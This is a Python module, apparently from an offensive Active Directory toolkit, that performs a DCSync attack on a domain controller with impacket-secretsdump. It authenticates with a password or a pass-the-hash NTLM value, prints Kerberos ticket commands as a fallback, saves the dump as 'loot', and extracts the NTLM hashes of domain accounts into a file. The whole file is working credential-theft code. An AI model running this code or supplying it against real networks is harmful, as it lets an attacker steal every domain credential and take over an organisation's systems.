import shutil
from core.helpers import run_command, save_loot
from core.colors import red, green, blue, yellow

def attack_dcsync(session):
    print(blue(f"[*] Attempting DCSync using impacket-secretsdump against {session.dc_ip}..."))

    if not shutil.which("impacket-secretsdump"):
        print(red("[-] impacket-secretsdump not found in PATH. Please install Impacket."))
        return

    if session.hash:
        cmd = (
            f"impacket-secretsdump {session.domain}/{session.username}@{session.dc_ip} "
            f"-hashes :{session.hash}"
        )
    elif session.password:
        cmd = (
            f"impacket-secretsdump {session.domain}/{session.username}:{session.password}@{session.dc_ip}"
        )
    else:
        print(red("[-] No password or NTLM hash found in session."))
        print(blue("[*] If you want to use a Kerberos .ccache, run this manually:"))
        fqdn = session.dc_hostname or session.dc_ip or "dc.domain.local"
        print(yellow(f"\nexport KRB5CCNAME=/full/path/to/your.ccache"))
        print(yellow(f"impacket-secretsdump -k -no-pass {session.domain}/{session.username}@{fqdn}\n"))
        return

    out, err = run_command(cmd)
    combined = out + "\n" + err

    # Save full output
    raw_log = f"dcsync_{session.dc_ip}.log"
    save_loot(raw_log, combined)
    print(green(f"[+] Full DCSync output saved to loot/{raw_log}"))

    # Try to extract NTLM hashes
    hash_lines = []
    for line in combined.splitlines():
        if ":::" in line and ":" in line:
            parts = line.split(":")
            if len(parts) >= 4 and all(len(h) == 32 for h in parts[2:4]):
                hash_lines.append(line)

    if hash_lines:
        hash_file = f"dcsync_ntlm_hashes_{session.dc_ip}.txt"
        save_loot(hash_file, "\n".join(hash_lines))
        print(green(f"[+] Extracted {len(hash_lines)} NTLM hashes. Saved to loot/{hash_file}"))
    else:
        print(yellow("[!] No NTLM hashes found. Check the full dump for more details."))
